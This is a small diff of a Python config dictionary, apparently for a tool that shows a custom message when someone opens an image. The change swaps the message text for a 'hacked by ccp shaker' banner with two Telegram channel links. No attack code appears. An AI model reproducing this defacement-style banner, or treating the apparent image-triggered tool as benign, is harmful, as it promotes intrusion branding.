@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "ye ye good ccp shaker", # Message to show
+        "message": "hacked by ccp shaker t.me/ccpshaker t.me/aizerisback", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
